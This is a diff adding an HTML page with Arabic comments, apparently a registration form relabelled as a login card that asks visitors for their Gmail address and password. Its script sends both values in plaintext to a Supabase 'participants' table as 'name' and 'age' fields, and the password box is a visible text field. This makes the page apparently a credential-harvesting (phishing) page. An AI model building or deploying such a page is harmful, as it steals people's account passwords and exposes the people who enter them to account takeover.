@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#e9f4ef">
+  <title>نموذج تسجيل</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    :root {
+      --green: #527d6b;
+      --green-dark: #3e6655;
+      --text: #35443d;
+      --muted: #7b8982;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 24px 16px;
+      font-family: Arial, sans-serif;
+      color: var(--text);
+      background:
+        radial-gradient(circle at top right, #e0eee7 0, transparent 40%),
+        radial-gradient(circle at bottom left, #eee7f8 0, transparent 42%),
+        #f7f8f6;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 410px;
+      padding: 30px 25px;
+      background: rgba(255, 255, 255, 0.95);
+      border: 1px solid #e8eee9;
+      border-radius: 24px;
+      box-shadow: 0 12px 35px rgba(68, 99, 81, 0.09);
+    }
+
+    .top-icon {
+      width: 62px;
+      height: 62px;
+      margin: 0 auto 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 20px;
+      background: #dcefe6;
+      color: var(--green-dark);
+      font-size: 29px;
+    }
+
+    h1 {
+      margin: 0 0 10px;
+      font-size: 25px;
+      text-align: center;
+      color: #40594b;
+    }
+
+    .description {
+      margin: 0 0 25px;
+      color: var(--muted);
+      font-size: 14px;
+      line-height: 1.9;
+      text-align: center;
+    }
+
+    .notice {
+      margin-bottom: 22px;
+      padding: 12px;
+      border: 1px solid #e9e3f4;
+      border-radius: 12px;
+      background: #faf8fd;
+      color: #777184;
+      font-size: 12px;
+      line-height: 1.9;
+      text-align: center;
+    }
+
+    .field {
+      margin-bottom: 19px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 9px;
+      color: #506358;
+      font-size: 14px;
+      font-weight: bold;
+    }
+
+    input {
+      display: block;
+      width: 100%;
+      padding: 14px 15px;
+      border: 1px solid #e1e9e3;
+      border-radius: 12px;
+      background: #fafcfb;
+      color: var(--text);
+      font-family: inherit;
+      font-size: 15px;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    input::placeholder {
+      color: #a5b0a9;
+    }
+
+    input:focus {
+      border-color: #86b49d;
+      box-shadow: 0 0 0 3px rgba(134, 180, 157, 0.15);
+    }
+
+    button {
+      width: 100%;
+      padding: 15px;
+      border: none;
+      border-radius: 13px;
+      background: var(--green);
+      color: white;
+      font-family: inherit;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.2s;
+    }
+
+    button:hover {
+      background: var(--green-dark);
+    }
+
+    button:active {
+      transform: scale(0.99);
+    }
+
+    button:disabled {
+      opacity: 0.65;
+      cursor: not-allowed;
+    }
+
+    #message {
+      display: none;
+      margin-top: 16px;
+      padding: 13px;
+      border-radius: 12px;
+      font-size: 14px;
+      line-height: 1.8;
+      text-align: center;
+    }
+
+    #message.success {
+      display: block;
+      background: #e6f5eb;
+      color: #35684b;
+    }
+
+    #message.error {
+      display: block;
+      background: #fff0ef;
+      color: #a34e4b;
+    }
+
+    .footer {
+      margin: 21px 0 0;
+      color: #9aa39d;
+      font-size: 12px;
+      line-height: 1.8;
+      text-align: center;
+    }
+
+    @media (max-width: 380px) {
+      .card {
+        padding: 25px 19px;
+      }
+
+      h1 {
+        font-size: 23px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <main class="card">
+
+    <div class="top-icon" aria-hidden="true">✿</div>
+
+    <h1>Welcome in Yousef_Eloraby web 🌿</h1>
+
+    <p class="description">
+      املأ البيانات التالية لإكمال التسجيل.
+      <br>
+      
+    </p>
+
+    <div class="notice">
+      Enter your login details
+    </div>
+
+    <form id="registrationForm">
+
+      <div class="field">
+        <label for="Your gmail">gmail</label>
+        <input
+          type="text"
+          id="name"
+          name="name"
+          maxlength="80"
+          autocomplete="name"
+          placeholder="Write your gmail here"
+          required
+        >
+      </div>
+
+      <div class="field">
+        <label for="password">password</label>
+        <input
+          type="text"
+          id="age"
+          name="age"
+          maxlength="50"
+          placeholder="Write your password here"
+          required
+        >
+      </div>
+
+      <button type="submit" id="submitButton">
+        Log in
+      </button>
+
+      <div id="message" role="status" aria-live="polite"></div>
+
+    </form>
+
+    <p class="footer">
+      
+    </p>
+
+  </main>
+
+  <script>
+    // ضع رابط مشروع Supabase هنا
+    const SUPABASE_URL = "ضع_رابط_مشروعك_هنا";
+
+    // ضع مفتاح Publishable العام هنا
+    // لا تضع مفتاح service_role أو أي مفتاح سري
+    const SUPABASE_KEY = "ضع_مفتاح_publishable_هنا";
+
+    const form = document.getElementById("registrationForm");
+    const submitButton = document.getElementById("submitButton");
+    const message = document.getElementById("message");
+
+    function showMessage(text, type) {
+      message.textContent = text;
+      message.className = type;
+    }
+
+    form.addEventListener("submit", async function(event) {
+      event.preventDefault();
+
+      const name = document.getElementById("name").value;
+      const age = document.getElementById("age").value;
+
+      // التحقق من أن الخانتين ليستا فارغتين فقط
+      if (!name.trim() || !age.trim()) {
+        showMessage("من فضلك املأ الخانتين.", "error");
+        return;
+      }
+
+      if (
+        SUPABASE_URL === "ضع_رابط_مشروعك_هنا" ||
+        SUPABASE_KEY === "ضع_مفتاح_publishable_هنا"
+      ) {
+        showMessage("أكمل إعدادات Supabase أولًا.", "error");
+        return;
+      }
+
+      submitButton.disabled = true;
+      submitButton.textContent = "جارٍ الإرسال...";
+
+      try {
+        const response = await fetch(
+          SUPABASE_URL.replace(/\/+$/, "") +
+          "/rest/v1/participants",
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "apikey": SUPABASE_KEY,
+              "Authorization": "Bearer " + SUPABASE_KEY,
+              "Prefer": "return=minimal"
+            },
+            body: JSON.stringify({
+              name: name,
+              age: age
+            })
+          }
+        );
+
+        if (!response.ok) {
+          throw new Error("تعذر حفظ البيانات");
+        }
+
+        showMessage("تم إرسال البيانات بنجاح.", "success");
+        form.reset();
+
+      } catch (error) {
+        showMessage(
+          "تعذر الإرسال. راجع إعدادات Supabase واتصال الإنترنت.",
+          "error"
+        );
+      } finally {
+        submitButton.disabled = false;
+        submitButton.textContent = "إرسال البيانات";
+      }
+    });
+  </script>
+
+</body>
+</html>
